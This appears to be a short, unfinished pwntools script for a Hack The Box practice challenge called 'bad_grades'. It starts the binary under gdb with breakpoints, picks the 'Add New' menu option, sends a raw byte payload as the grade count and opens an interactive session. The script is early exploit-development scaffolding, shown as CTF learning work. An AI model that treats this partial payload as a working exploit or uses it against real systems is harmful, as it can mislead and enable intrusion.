from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./bad_grades")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/CTF/htb/bad_grades/libc.so.6"}

#p = remote("1.2.3.4", 30246)
#p = process("./restaurant")
p = gdb.debug("./bad_grades", '''
b *0x00400fd5
b *0x00401184
b *0x004010e7
b *0x4010f1
''')

# 2. Add New.
p.recvline()
p.sendline(b'2')

# Number of Grades:

payload = b'\x00\x00\x00\x41'
p.recvline()
p.sendline(payload)

p.interactive()

